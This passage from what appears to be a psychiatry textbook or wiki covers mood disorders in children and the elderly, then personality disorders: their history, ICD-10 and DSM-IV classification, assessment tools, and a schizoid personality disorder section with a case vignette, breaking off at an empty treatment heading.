Clinically depression in this age group presents with the same core features manifested in adults. Some minor differences suggest the presence of irritable rather than depressed mood and failure to attain expected weight gain instead of weight loss.  Among pre-school children often lack of smiling, apathy towards play, lack of involvement in all activities, physical complaints, and physical aggression while among school-aged children, deteriorating school performance, increased irritability, fighting, or argumentativeness and avoidance of peers may signal depression. Exacerbation of anxiety symptoms and school refusal are not uncommon among children who are depressed. 
      
Switching from unipolar depression to bipolar disorder is significantly higher in children than it is in adults, and it reaches 32% within a 5 year period. Also, it is reported that in children, mania might present with a chronic instead of an episodic pattern, with mixed and rapid cycling features instead of classic manifestations and high comorbid mental disorders. These suggest that childhood-onset bipolar disorder is a more severe form of the illness, and relatively treatment resistant. The main disorders that should be differentially diagnosed are attention-deficit/hyperactivity disorder and disruptive behavior disorders (Geller &amp; Luby, 1997).
      
The psychological treatment of children and adolescents with mood disorders are similar to those for adults. On the contrary there is a significant controversy concerning pharmacotherapy. Double-blind studies are missing and it seems that these age groups are particularly vulnerable for the induction of suicidality by antidepressants. Flouxetine, quetiapine and lithium are the better studied agents in terms of efficacy in these age groups (Andrade, Bhakta, &amp; Singh, 2006; Azorin &amp; Findling, 2007; Barzman, DelBello, Adler, Stanford, &amp; Strakowski, 2006; Chang, 2008; DelBello et al. 2006; DelBello, Adler, Whitsel, Stanford, &amp; Strakowski, 2007; Dudley, Hadzi-Pavlovic, Andrews, &amp; Perich, 2008; Jensen, Buitelaar, Pandina, Binder, &amp; Haas, 2007; Marchand, Wirth, &amp; Simon, 2004; Tsapakis, Soldani, Tondo, &amp; Baldessarini, 2008; Usala, Clavenna, Zuddas, &amp; Bonati, 2008).  ECT and TMS might be reasonable alternatives if initial therapeutic attempts fail (Morales, Henry, Nobler, Wassermann, &amp; Lisanby, 2005).
      
===== Geriatric =====
      
A world wide trend is the increase in both the absolute numbers and percentage in the total population of the elderly. This of course leads to an increase in the numbers of geriatric psychiatric patients and a shift of the focus of health care services. At the same time, geriatric mental patients present with multiple challenges both at the diagnostic as well as the therapeutic level. 
      
The prevalence of major depression is estimated to be 2% in the general population over 65 years of age (Blazer, Burchetti, Service, &amp; al, 1991; Reynolds, 1992; Vaillant, Orav, Meyer, McCullough Vaillant, &amp; Roston, 1996), with up to 15% having some kind of other mood disorder (Branconnierm et al. 1983) and 25-40% of patients in the general hospital setting having a sub-threshold depression (Rapp, Parisi, &amp; Walsh, 1988). In residential homes, the accepted value for patients with MDD is approximately 12%, with an additional 30% manifesting a milder form of depressive-like symptomatology (Foster, Cataldo, &amp; Boksay, 1991; Katz, Lesher, Kleban, Jethanandani, &amp; Parmelee, 1989; Katz &amp; Parmelee, 1994; NIH, 1992; Parmelee, Kleban, Lawton, &amp; Katz, 1991; Weyerer, Hafner, Mann, Ames, &amp; Graham, 1995).
      
The recognition of geriatric mood patients (with a late onset mood disorder) is poor and less than 50% of hospitalised patients with depression in general medical practice are referred to a psychiatrist, and less than 20% receive adequate treatment (Shah &amp; De, 1998). The same time, geriatric patients with depression have up to 1.5-3 times higher morbidity (Parmelee, Kalz, &amp; Lawton, 1992), with the lifetime risk of suicide being as high as 15%; almost 10% of them die annually (Murphy, 1994). The ratio of males to females with MDD remains stable across the age spectrum (PW Burvill, Hall, Stampfer, &amp; Emmerson, 1989).
      
Late onset mood patients are less likely to have a positive family history for mood disorders compared to younger patients (Hopkinson, 1964; Mendlewicz, 1976) and are more likely to manifest structural changes of the CNS (Burvill et al. 1989; Jacoby &amp; Levy, 1980; Rabins, Pearlson, Aylward, Kumar, &amp; Dowell, 1991). Neuroimaging studies have reported a variety of morphological disturbances, which clearly differentiate late-life depression from depression of younger ages (Greenwald et al. 1996; Jakoby, Lewy, &amp; Bird, 1980, 1981; Rabins et al. 1991; Sackheim, Prohonik, Moeller, &amp; al., 1993; Steffens &amp; Krishnan, 1998; Uradhyaya, Abou-Saleh, Wilson, Grime, &amp; Critchley, 1990), clearly suggesting an association to an increased severity of subcortical vascular disease and greater impairment of cognitive performance (Salloway et al. 1996). More, major depression is more common and more severe in patients with vascular dementia (Ballard, Bannister, Solis, Oyebode, &amp; Wilcock, 1996).
      
Various studies of depression in the elderly reported that mood is more often irritable than depressive (Monfort, 1995), and also several symptoms like loss of weight, feelings of guilt, suicidal ideation, melancholic features, hypochondriasis as well as associated symptoms of psychosis could be more frequent (Brown, Sweeney, Loutsch, Kocsis, &amp; Frances, 1984; Lader, 1982; Lyness, Conwell, &amp; Nelson, 1992; Musetti, Perugi, Soriani, Rossi, &amp; Cassano, 1989; Nelson, Conwell, Kim, &amp; Mazure, 1989).  However, these findings vary across studies. Many of these patients manifest a type of behavior that can be characterized as &quot;passive-aggressive&quot; or &quot;self-aggressive.&quot; They refuse to get up from bed, eat, wash themselves, or talk.  Also, they often hide important information concerning severe somatic disease and in this way they let it go untreated.
      
Somatic symptoms are difficult to assess and, as a general rule, physicians should avoid assigning this symptomatology to an underlying mental disorder. It is highly likely the patient indeed suffers from a true &quot;somatic&quot; disorder even in cases the physician is unable to diagnose it (APA, 1994).  On the other hand, it is clear that elderly depressives manifest more somatoform symptomatology, in comparison to younger depressives. In this frame, the concept of Masked Depression (Modai, Bleich, &amp; Gygielman, 1982) used to be popular in the past, but today it is not accepted by either classification system although it is accepted that the onset of health concerns in old age is more likely to be either realistic or to reflect a mood disorder (APA, 1994).  Percentages of comorbidity between depression and physical illness vary from 6% to 45% (Kitchell, Barnes, Veith, &amp; al. 1982; Kok, Heeren, Hooijer, &amp; al., 1995). The large discrepancy reflects the difficulty in the application of operationalized criteria for the diagnosis of depression in patients with general health problems. Greater overall severity of medical illness, cognitive impairment, physical disability and symptoms of pain or other somatic complaints seem to be a more important predictor of depression than specific medical diagnoses (Williamson &amp; Schulz, 1992). 
      
About 38-58% (Alexopoulos, 1991) of the elderly suffering from major depression also fulfill criteria for an anxiety disorder while many authors have suggested that the presence of anxiety in the elderly should be considered as a sign of depression, even in cases, which lack true depressive symptomatology (Collins, Katona, &amp; Orrell, 1994). 
      
In elderly individuals there is an increased possibility of the co-existence of depression and dementia, or some other type of &quot;organic&quot; decline of cognitive disorder. The syndrome of &quot;pseudodementia&quot; has also been described (Kiloh, 1961). This term refers to the manifestation of dementia symptomatology, which in fact is due to depression and disappears after antidepressant therapy. It is also described the emergence of late onset bipolarity in the frame of an ongoing dementing pathology (Akiskal &amp; Pinto, 1999; Akiskal &amp; Benazzi, 2005; Ng et al. 2007)
      
Suicide constitutes an important health problem for the elderly. Elderly men are at a higher risk for completing suicide than elderly women. The co-existence of a serious somatic disease, like renal failure or cancer, represents a major risk factor for a well-planned suicide attempt (Heikkinen &amp; Lonnqvist, 1995).  Other risk factors include loneliness and social isolation, usually as a consequence of bereavement. The failure to follow medical advice in serious general medical conditions could be considered to be a form of &quot;passive suicide.&quot; On the other hand, &quot;rational&quot; suicide plans are not common even in severely ill patients. There is a possibility of acute-onset suicidal plans (after an acute incidence concerning general health e.g., stroke or heart attack) (Kishi, Robinson, &amp; Kosier, 1996).
      
The pharmacotherapy of late-onset mood disorder includes the cautious use of antidepressants including amitriptyline, imipramine, nortriptyline and all the SSRIs  which are most widely prescribed antidepressants among the geriatric population, because of their favorable side-effect profile, relative safety in overdose, ease of use and smaller dosage adjustment makes them first-line choices. Also venlafaxine, mirtazapine, and bupropion could be useful. 
      
For bipolar cases, lithium and anticonvulsants are useful although they are not well studied in elderly patients (Fountoulakis et al. 2003). It is mostly used in cases of refractory depression for the augmentation of antidepressant therapy. Antipsychotics, especially second generation ones could be used although there is a warning for a higher mortality because of their use in the elderly. ECT is another option with many studies reporting better outcomes in older than in younger patients. However, by far the most troubling side effect of ECT, especially in the elderly, is cognitive impairment. 
      
Psychotherapy is also an option (Gerson, Belin, Kaufman, Mintz, &amp; Jarvik, 1999; Gum &amp; Arean, 2004). The presence and severity of medical illnesses, physical disability, cognitive impairment and psychomotor retardation make psychotherapeutic intervention difficult and affect its efficacy and success. The form of psychotherapy should be adjusted to the patient’s personality, behavior patterns as well as his/her cultural and educational level. Behavioral therapy, cognitive-behavioral therapy and problem-solving therapy have been extensively studied for their effectiveness in the treatment of depression in elderly. Fewer studies have been carried out for the efficacy of interpersonal psychotherapy. Non-standardized psychotherapies such as, psychodynamic psychotherapy and reminiscence therapy, are also proposed as appropriate treatments for geriatric depression.
      
The combination of pharmacological and psychological treatments is associated with higher improvement rates than pharmacotherapy alone and considered more effective than either treatment alone in preventing recurrence of depression (Bartels et al. 2002). In long-term therapies, the addition of psychotherapy promotes adherence to treatment (Pampallona, Bollini, Tibaldi, Kupelnick, &amp; Munizza, 2004). 
      
Eventually however, most studies support the opinion that geriatric depression carries a poorer prognosis than depression in younger patients. However, many authors attribute this, to factors like failure to make an early diagnosis and improper or insufficient treatment. For patients with geriatric depression, the prognosis is more dependent on physical handicap or illness and lack of social support, however further research on this issue is needed. Thus, the effective prevention of late-life depression requires attention to maintaining the community infrastructure and support.

===Background===

Treating psychopathology requires an understanding of personality. Research on the DSM and ICD disorders is making it increasingly clear that: 

1. anxiety, depression, eating disorders, substance abuse, sexual disorders, and other DSM Axis I Clinical Syndromes occur more often in the context of Personality Disorders (PDs) (Shea, Widiger, &amp; Klein, 1992); 

2. patients with multiple clinical syndrome diagnoses often have PDs (Newman, Moffitt, Caspi,&amp; Silva, 1998); and 

3. even those patients who lack personality disturbances severe enough to warrant a DSM or ICD personality diagnosis often have clinically significant pathology, such as difficulties with intimacy, management of aggression or self-assertion, rejection-sensitivity, etc (Westen, 1997).

There is little question that inclusion of a PD axis in the DSM and ICD, and its refinement through two decades of research, has been a crucial step in the evolution of more clinically and empirically useful diagnostic manuals. Knowing that a patient has major depression is certainly important, but adding the &quot;qualifier&quot; that the patient also has borderline PD is equally important because it has significant implications for prognosis and treatment.

PDs have historically been in a tangential position among diagnostic syndromes, never having achieved a significant measure of recognition in the literature of either clinical psychiatry or abnormal psychology. Prior to the DSM-III and ICD-8, they were categorized in the official nomenclature with a mélange of other miscellaneous and essentially secondary syndromes. Today, PDs occupy a place of diagnostic prominence, having been accorded a contextual role in the multiaxial schema of the DSM. Personality pathologies comprise one of two required &quot;mental disorder&quot; axes in the DSM. Henceforth, clinicians must not only assess the patient's current symptomatology, indicated on Axis I, but also evaluate those pervasive features which characterize the patient's enduring personality pattern, recorded on Axis II. In effect, the revised American multiaxial format requires that symptom states no longer be assessed as clinical entities isolated from the broader context of the patient's lifelong style of relating, coping, behaving, thinking, and feeling - that is, his or her personality. 

Personality and its disorders are regarded as a potential diathesis (Tyrer, 2007). There are clinical theorists who assert that it is the patient’s personality that should be evaluated first; only secondarily should the patient’s clinical state be considered. There are substantive reasons for attending to the PDs first, beyond the pragmatics of adhering to official nosological requirements. Lifelong personality traits appear to serve as a substrate, as well as a context for understanding more florid and distinct forms of psychopathology. Since the early 1960s, most societies have been increasingly committed to the early identification and prevention of mental disorders. This emphasis has led clinicians to attend to both premorbid behavioural signs and the less severe variants of emotional disturbance. Ordinary anxieties, minor personal conflicts, and social inadequacies are now seen by many clinicians as the forerunners of more serious problems. 
A significant impetus to this movement is the emergence of community health centres whose attentions are directed to the needs of the less seriously disturbed. As a result of these developments, the scope of clinical psychopathology was broadened far beyond its historical province of &quot;Hospital Psychiatry.&quot; As a field, it now encompasses the full spectrum of mild to severe mental disorders. With personality as a contextual foundation, diagnosticians have become more proficient in understanding personality dynamics and can more clearly trace the sequences through which both subtle and dramatic clinical symptoms unfold. 

===Social Costs===

PDs have been estimated to affect at least 10% of the population, and constitute a large percentage of the patients seen by psychiatrists. Yet unlike other diagnoses, PDs may or may not be associated with subjective symptoms. While some categories show high comorbidity with symptomatic diagnoses such as anxiety and depression, some PDs produce distress in other people rather than in the patient.  But in either case, the overall functioning of patients with PDs is often marginally social, comparable in many cases to levels seen in patients with chronic conditions such as schizophrenia.

Numerous studies suggest that PDs are underappreciated causes of social cost, morbidity, and mortality. PDs are associated with crime, substance abuse, disability, increased need for medical care, suicide attempts, self-injurious behaviour, assaults, delayed recovery from Axis I and medical illness, institutionalization, underachievement, underemployment, family disruption, child abuse and neglect, homelessness, illegitimacy, poverty, STDs, misdiagnosis and mistreatment of medical and psychiatric disorders, malpractice suits, medical and judicial recidivism, disruption of psychiatric treatment settings, and dependency on public support. The amount of social cost and disruption caused by the PDs is disproportionate to the amount of attention it gets in the public consciousness, in government research funding, in medical school education or even in psychiatric residency training And no less important than dealing with the social costs of personality disorders is the potential value inherent in preventive programs designed to enhance personality resilience and adaptive capacities.

===Definitions===

Personality is seen today as a complex pattern of deeply embedded psychological characteristics that are largely nonconscious and not easily altered, expressing themselves automatically in almost every facet of functioning. Intrinsic and pervasive, these traits emerge from a complicated matrix of biological dispositions and experiential learnings, and ultimately comprise the individual's distinctive pattern of perceiving, feeling, thinking, coping, and behaving.

Personality is the patterning of characteristics across the entire matrix of the person. Rather than being limited to a single trait, personality regards the total configuration of the person’s characteristics: interpersonal, cognitive, psychodynamic, and biological. Each trait reinforces the others in perpetuating the stability and behavioural consistency of the total personality structure. For the personality disorders, then, causality is literally everywhere. Each domain interacts to influence the others, and together, they maintain the integrity of the whole structure. 

Personality disorders are not diseases or disorders in the usual medical disease sense. Rather, PDs are theoretical constructs employed to represent varied styles or patterns in which the personality system functions maladaptively in relation to its environment. When the alternative strategies employed to achieve goals, relate to others, and cope with stress are few in number and rigidly practiced (adaptive inflexibility), when habitual perceptions, needs, and behaviours perpetuate and intensify pre-existing difficulties (vicious circles), and when the person tends to lack resilience under conditions of stress (tenuous stability), we speak of a clinically maladaptive personality pattern, that is, a PD.

===Differentiating Normality and Abnormality===

Distinctions between normality and pathology are largely social constructions or cultural artefacts. Normality and pathology must be viewed as relative concepts; they represent arbitrary points on a continuum or gradient - no sharp line divides normal from pathological behaviour. Among diverse and ostensibly content- and culture-free criteria used to signify normality are a capacity to function autonomously and competently, a tendency to adjust to one’s social milieu effectively and efficiently, a subjective sense of contentment and satisfaction, and the ability to self-actualize or to fulfil one’s potentials throughout the life span into one’s later years.

PDs were noted either by deficits among the preceding or by the presence of characteristics that actively undermine these capacities. Perhaps these criteria are too westernized or Eurocentric to be universal. In some Asian cultures, for example, where the individual is expected to subordinate individual ambitions to group consensus, the capacity to function autonomously might be praiseworthy, but the desire to do so is not. The traits which compose a number of personality styles are likely in certain historical periods or cultures, such as contemporary Western societies, to promote healthy functioning (e.g., Histrionic, Compulsive, Narcissistic traits). Similarly, in this society, there are personality styles and traits that are highly conducive to pathological functioning (e.g., Avoidant, Dependent, Masochistic). There are other personality patterns (e.g., Schizotypal, Borderline, Paranoid) which have a very small probability of falling at the normal end of the continuum in almost all cultures. 

===Historic antecedents===

The interest in the description of individual differences is very old. In Theophrastus’ Characters, written in the 3rd century BC, 32 different types of human beings are described, some of them familiar to clinicians nowadays (Theophrastus, 1998). In the fourth century B.C. Hippocrates concluded that all disease stemmed from an excess of or imbalance among four bodily humours: yellow bile, black bile, blood, and phlegm. Hippocrates identified four basic temperaments, the choleric, melancholic, sanguine, and phlegmatic; these corresponded, respectively, to excesses in yellow bile, black bile, blood, and phlegm. Although the doctrine of humours has been abandoned, giving way to scientific studies on topics such as neurohormone chemistry, its terminology and connotations still persist in such contemporary expressions as being sanguine or good humoured.

Along the 19th century the concept of pathological personality was forged. Pinel in 1809 described his manie sans délire, that is to say, mental illness without symptoms of illness, to which he later on also referred as folie raisonnante, that is to say, madness without insanity. 

J.A. Koch who proposed, replacing the established label moral insanity, with the term psychopathic inferiority Koch used the term psychopathic, a generic label employed to characterize all personality diagnoses until recent decades, to signify his belief that a physical basis existed for these character impairments. The prime psychiatric nosologist at the turn of the century, Emil Kraepelin, did not systematize his thinking on PDs, but in his efforts to trace the early course of these syndromes, Kraepelin &quot;uncovered&quot; two premorbid types: the &quot;cyclothymic disposition,&quot; exhibited in four variants, each inclined to maniacal-depressive insanity; and the &quot;autistic temperament,&quot; notably disposed to dementia praecox. 

The best-known European classification of disordered personalities was proposed by Kurt Schneider. Schneider differed from many of his contemporaries, most notably the prime modern constitutionalist The best-known and perhaps most fully conceptualized of PDs are those formulated by psychoanalytic theorists. Their work was crucial to the development of an understanding of the causal agents and progressions that typify the background of these disorders. It was Sigmund Freud and his younger associates, Karl Abraham and Wilhelm Reich, who laid the foundation of the psychoanalytic character typology h.

Although numerous analytic theorists have continued to contribute to the study of character, the contemporary work of Otto Kernberg deserves special note. Taking steps to develop a new psychoanalytic characterology, Kernberg constructed a framework for organizing personality types in terms of their level of severity to speak of &quot;higher, intermediate and lower levels&quot; of character pathology; both intermediate and lower levels are referred to as &quot;borderline&quot; personality organizations.

Note should be made of another productive personologist who utilized a mathematical/factorial approach to construct personality dimensions, namely Raymond Cattell (Cattell, RB (1965)). His research has led him to identify 16 primary traits, which he then arranged in sets of bipolar dimensions that would undergird personality types. Other contemporary quantitative contributors include Peter Tyrer (Tyrer, 1988) and W. John Livesley  (Livesley, 1987). 

In a model which seeks to draw on genetic and neurobiologic substrates, Robert Cloninger has proposed a complex theory based on the interrelationship of several trait dispositions. Another biosocial model using three pairs of evolutionary polarities as a basis is one developed by Theodore Millon. Here, he derived a PD taxonomy that subsumed the dependent, independent, ambivalent, and detached coping styles with an activity-passivity dimension. Notably, in their recent work, numerous theorists have begun to turn their attention to positive mental health, speaking of personality resilience and adaptive capacities.

===The Current Official Systems, ICD-10 and DSM-IV TR===

Two classificatory systems of mental disorders are recognized internationally today, namely, the Diagnostic and Statistical Manual of Mental Disorders - 4th Edition-Text Revised (DSM-IV-TR)19 and the International Classification of Mental and Behavioural Disorders (ICD-10)20. Personality disorders are given important weight in both classifications. The DSM-IV-TR places them in its separate Axis II (this classification comprises five such axes). The personality disorders in the DSM are grouped into three clusters, based essentially on empirical descriptive similarities; this cluster grouping has not (and maybe never will be) been satisfactorily validated but its widespread use indicates a frequent wish to reduce the number of categories. Cluster A includes paranoid, schizoid and schizotypal personality disorders (the so-called odd or eccentric individuals), Cluster B comprises antisocial, borderline, histrionic and narcissistic PDs (the ostensible dramatic, emotional or erratic individuals), and Cluster C includes avoidant, dependent and obsessive-compulsive PDs (anxious/fearful individuals). A last category, &quot;PD not otherwise specified,&quot; comprises disorders of personality that do not fulfil the specific criteria for any of the above individual PDs. 

The ICD-10 Classification includes a single section covering all personality abnormalities and persistent behavioural disturbances. This is separated into specific named personality disorders, mixed and other personality disorders, and enduring personality changes. The individual personality disorders are paranoid, schizoid, dissocial, emotionally unstable (impulsive and borderline types), histrionic, anxious (avoidant), anankastic and dependent ones. Two more categories are &quot;other specific PDs&quot; and &quot;PD, unspecified.&quot; The ICD classification is similar to that of DSM-IV, although differences are noteworthy. For example, the borderline PD of the DSM-IV is subsumed as one of the two emotionally unstable disorders in ICD-10, the obsessive-compulsive adjective in DSM-IV is retained as &quot;anankastic&quot; in ICD-10, and avoidant personality disorder is only a partial equivalent of the ICD-10 anxious personality disorder. Two more disorders included in the official section of the DSM-IV are excluded from ICD-10; schizotypal disorder is a variant within the schizophrenia spectrum of conditions in ICD-10 and narcissistic personality disorder is only mentioned in the section on &quot;other specific PDs&quot; in ICD-10, without any specific criteria noted for this diagnosis. The ICD-10 contains other general categories that refer to PDs that have no counterpart in the DSM-IV, such as &quot;mixed disorders&quot; and &quot;other disorders of adult personality and behaviour.&quot;

===Diagnostic assessment===

Five broad sources of information are available to help describe the clinical problem; each has its own advantages and limitations. 

The first comprise clinical interviews and observations; the clinician observes and asks the questions and the subject responds verbally, often in a free-form style. The clinician is free to follow any particular line of questioning desired and usually mixes standard questions with those specific to the current problem.

The second is structured or semi-structured interviews. Open ended, free form style clinical interviews may provide insufficient information to assess the different personality disorders. Interviewer- administered interviews, structured or semi-structured, systematically address and assess each personality disorder criteria with standard questions or probes. The most often used are International Personality Disorders Examination (IPDE), Structured Clinical Interview for DSM-IV Axis II Personality Disorders (SCID-II) and  

The third second are formal rating scales and checklists; a person familiar with the subject completes those forms in order to provide an objective perspective. Rating scales and checklists often serve as a memory aid, ensuring that everything relevant to the disorder is included in developing a treatment plan. Rating scales usually have more items than the diagnostic criteria for the same syndrome and are usually held to a higher standard of scientific rigor. Because they have more items, they provide more fine-grained measurements, but they also take more time to complete. For example, the revised Psychopathy Checklist (PCL-R) consists of 20 items, whereas the DSM-IV offers only seven criteria for the diagnosis of antisocial PD. Although the PCL-R is widely used in the study of psychopathy, few rating scales exist for use with other PDs.

The third source is the self-report inventory; subjects literally report on themselves by completing a standard list of items. Because self-reports represent the subject’s own responses, they can be especially valuable in quickly identifying clinical symptoms. Unless the individual is violent or psychotic, a self-report inventory can be given at any point during the clinical process, often with minimal supervision. A profile obtained at the beginning of therapy, for example, can be used as a baseline to evaluate future progress. A number of other self-report instruments are available. The Tridimensional Personality Questionnaire (TPQ),, Millon Clinical Multiaxial Inventory (MCMI-III), Neuroticism-Extroversion-Openness- Personality Inventory Revised (NEO-PI-R), The Dimensional Assessment of Personality Pathology-Basic Questionnaire (DAPP), The Schedule of Nonadaptive and Adaptive Personality (SNAP) are the most often used self-report assessment instruments.

The fourth source of information is projective techniques, an attempt to access unconscious structures and processes that would not ordinarily be available to the subject at the level of verbal report. These techniques seek to draw out internal, and frequently unconscious, influences on behaviour by presenting the subject with inherently unstructured, vague, or ambiguous situations. The Rorschach Inkblot Test is the classic example. The subject is presented with a series of 10 blots in turn and asked to report what he or she sees. The Thematic Apperception Test uses pictures of various interpersonal situations. The subject constructs a story to explain what is happening in the picture, what led up to these events, and how matters will end. Because projective instruments are time-consuming and not widely regarded as being as psychometrically sound as self-report inventories, their use has waned in recent years, especially with the economic constraints of managed care.

Finally the use of inmates (informants) of the subject, perhaps a spouse, teacher, parent, or good friend, someone who can provide perspective on the problem, might also be considered another important source of information.

===Problems in the current classification===

The official classification systems reflect a variety of personality related issues that are likely to be solved in the near future with the revision of both systems. 

First, there is the question of the retention of personality disorders on a different axis (Axis II) from that of clinical syndromes (Axis I) in the DSM-IV. The division between Axis I and Axis II seems to some to be arbitrary and not justified adequately. 

A second persistent problem is the classificatory status of the individual categories of personality disorder. There is great overlap between the criteria for diagnosing personality disorders in both DSM-IV and ICD-10 and this seriously compromises their validity as separate disorders. Clear differentiation between the disorders is often difficult and many individuals diagnosed with a personality disorder have several other personality disorders that do not always appear to be fundamentally different. 

A third issue is the overlap of some personality disorders with disorders in Axis I. An example is the relationship between avoidant PD and generalized social phobia, both of which address the same group of symptoms without a clear distinction between them. Although still included in the Appendix B of DSM-IV, there seems to be a similar problem between depressive personality disorder (Axis II) and dysthymia (Axis I). 

A fourth question is how many personality disorders deserve separate description in the two classification systems? It is also uncertain what type of criteria should constitute the building blocks of personality disorder and how many of them are needed for each diagnosis. Both classifications rest mainly on historical traditions and committee consensus rather than on empirical data or well-constructed theoretical grounds. Many of the assumptions of each classification are implicit or covert and need to be exposed so that diagnosis can be made consistently and subjected to systematic testing. Fifth, there are also many questions about the division between &quot;normal&quot; personality and personality disorders that need answering and whether it is wise to have a division at all.  

Sixth, another major controversy in the field is the categorical/dimensional/prototypical controversy, to which we will turn shortly.  A further issue is the polythetic criterion lists used in current classification systems; these produce considerable intragroup variability such that two people with the same diagnosed PD may display very different features because they score for different sections. 

Finally seventh , as already mentioned, PDs are tied to cultural variables to a much greater extent than the clinical disorders in Axis I, creating difficulties when diagnosing this kind of disorders across different cultures, a topic we will also address in a later section.

Given the need for a clear unambiguous official classificatory system for personality disorders and the dissatisfaction with the current two systems, there are likely to be important changes in the classification of personality disorders in DSM-V and ICD-11. Perhaps the most important question is &quot;how do we improve the clinical utility of the classification of personality disorders so that it is recognised to be helpful in decision-making at all levels?&quot;

==Each of the Personality Disorders== 

The Personality Disorders are grouped into three clusters based on descriptive similarities.

Cluster A includes paranoid, schizoid and schizotypal personality disorders (the so-called odd or eccentric individuals), Cluster B comprises antisocial, borderline, histrionic and narcissistic PDs (the ostensible dramatic, emotional or erratic individuals), and Cluster C includes avoidant, dependent and obsessive-compulsive PDs (anxious/fearful individuals).

A general definition of personality disorders are provided in DSM-IV-R and in ICD-10. It can be useful to psychiatrists and clinical psychologists, because the most common diagnosis in clinical practice is the diagnosis &quot;not other specified&quot; (Clark et al. 1995)

'''General criteria diagnostic criteria for a Personality Disorder (ICD-10)'''

A specific personality disorder is a severe disturbance in the characterological constitution and behavioural tendencies of the individual, usually involving several areas of the personality, and nearly always associated with considerable personal and social disruption. Personality disorder tends to appear in late childhood or adolescence and continues to be manifest into adulthood. It is therefore unlikely that the diagnosis of personality disorder will be appropriate before the age of 16 or 17 years. General diagnostic guidelines applying to all personality disorders are presented below; supplementary descriptions are provided with each of the subtypes.

'''Diagnostic guidelines'''

Conditions not directly attributable to gross brain damage or disease, or to another psychiatric disorder, meeting the following criteria:

(a) markedly dysharmonious attitudes and behaviour, involving usually several areas of functioning, e.g., affectivity, arousal, impulse control, ways of perceiving and thinking, and style of relating to others;

(b) the abnormal behaviour pattern is enduring, of long standing and not limited to episodes of mental illness;

(c) the abnormal behaviour pattern is pervasive and clearly maladaptive to a broad range of personal and social situations;

(d) the above manifestations always appear during childhood or adolescence and continue into adulthood;

(e) the disorder leads to considerable personal distress but this may only become apparent late in its course;

(f) the disorder is usually, but not invariably, associated with significant problems in occupational and social performance.

For different cultures it may be necessary to develop specific sets of criteria with regard to social norms, rules and obligations. For diagnosing most of the subtypes listed below, clear evidence is usually required of the presence of at least three of the traits or behaviours given in the clinical description.

'''Case vignette'''

Jacob is a 26 years old man. Despite extraordinary intelligence John was not able to complete or participate in any educational program. He wanted to have a normal life with a family and friends, but thought that he was rootless and he felt that other people thought that he was peculiar or odd. He felt that he was outside. As a child he went to various schools because his parents moved around. He was thought of as a lonely wolf and did not participate in the social life or games of sports with his peers.  During school class he was often absent minded being absorbed in his own thoughts and fantasies. From around the age of thirteen he became interested in computers and was quite advanced in his understanding of mathematics. He became exceedingly isolated with his computer as his sole companion. 
     
This vignette schizoid personality illustrates the difficulties how to establish a stable relationship to significant others like peers and family. Often it is regarded as unusual that a person with schizoid personality disorders complains by himself or herself to be isolated. Many schizoid patients, in the contrary, claim to be quite satisfied with their loneliness and it is quite unusual that he wish to have a family. Also schizoid persons usually accept their situation or even deny any desire for closer relationships. 
     
'''Clinical Description'''

Diagnostic Criteria ICD-10

F60.1	Schizoid personality disorder

	Personality disorder meeting the following description:

(a) few, if any, activities, provide pleasure;

(b) emotional coldness, detachment or flattened affectivity;

(c) limited capacity to express either warm, tender feelings or anger towards others;

(d) apparent indifference to either praise or criticism;

(e) little interest in having sexual experiences with another person (taking into account age);

(f) almost invariable preference for solitary activities;

(g) excessive preoccupation with fantasy and introspection;

(h) lack of close friends or confiding relationships (or having only one) and of desire for such relationships;

(i) marked insensitivity to prevailing social norms and conventions.

Excludes: 	Asperger's syndrome (F84.5) 
			delusional disorder (F22.0)
			schizoid disorder of childhood (F84.5) 
			schizophrenia (F20. - )
			schizotypal disorder (F21)

The central feature of Schizoid Personality Disorder (SPD) is a pattern of pervasive social detachment and a narrow range of emotional expression in social settings.
The DSM-IV criteria for SPD differ in detail in three criteria from the ICD-10 diagnostic criteria. The both describe the SPD by seven criteria, of which at least three must be applicable. 
The SPD is most clearly defined within relationships. Individuals with this disorder are characterized by a profound defect in their ability to form personal relationships or to respond to others in an emotionally meaningful way and appear to lack a desire for intimacy. They are introverted, aloof, and seclusive, and select activities that do not include much interaction with others. This style of life easily results in social isolation. 

'''Differential Diagnosis'''

The differential diagnosis of SPD includes: 

1. a normal preference for solitary pursuits that does not meet the criteria for schizoid personality disorder; 

2. schizophrenia (in which further characteristic negative or positive symptoms occur); The SPD appears to characterize the negative symptoms of schizophrenia, e.g., social, interpersonal, and affective deficits like little affect, low energy, anhedonia, diffidence about, shyness in, or detachment from relationships.

3. schizotypal personality disorder (in which there are cognitive and perceptual distortions); In contrast to the schizotypal personality disorder the SPD does not include psychotic-like cognitive/perceptual distortions.

4. paranoid personality disorder (in which the patient displays suspiciousness and paranoid ideations); 

5. avoidant personality disorder (in which the patient has a fear of being embarrassed or inadequate, with excessive anticipation of rejection); 

6. obsessive-compulsive personality disorder (in which there may be apparent social detachment that arises from devotion to work and discomfort with emotions; capacity for intimacy is usually preserved); 

7. disorders of more severely impaired social interaction, stereotyped behaviours and limited interests (e.g., autistic disorder, Asperger’s disorder); 

8. personality change caused by a general medical condition (e.g., temporal lobe epilepsy); 
personality symptoms derived from chronic substance use (Sass, 2007). 

'''Comorbidity'''

The most frequent co-occurring personality disorders with SPD are schizotypal and avoidant personality disorders and to a lesser degree paranoid, antisocial and borderline personality disorders (Kalus et al. in Livesley, 1995, p.65). The highest co-occurrences may perhaps be because of the high overlap between the two criteria sets. The SPD and the schizotypal personality disorder, for example, share the important criteria of social isolation and restricted affect. Also the avoidant personality disorder may seek isolation, but individuals with SPD will tolerate the separation with comfort, while individuals with avoidant personality disorder will be distressed and lonely. SPD can an antecedent disorder to schizophrenia, major depression, dysthymia or a delusional disorder. Further it shows high comorbidity with social phobia and agoraphobia. If people with SPD are detached from a supportive family they often become involved with drugs and alcohol.

'''Prevalence'''

SPD is uncommon in clinical treatment settings. SPD is diagnosed more frequently in males who seem to be more impaired than females with SPD.

'''Etiology''' 

The etiology of SPD has not been established. A close genetic relationship to schizophrenia has been proposed but is doubtful. Conversely, introversion has been shown to be a highly heritable personality trait. Psychological theories suggest sociocultural factors in the genesis of the disorder: In the psychodynamic approach, the SPD emerges from inadequacies in earliest relationships with parental figures. The cognitive approach suggests that the most important source of dysfunctional behaviour and affects lie in incorrect attributions that people make. 

'''Treatment'''

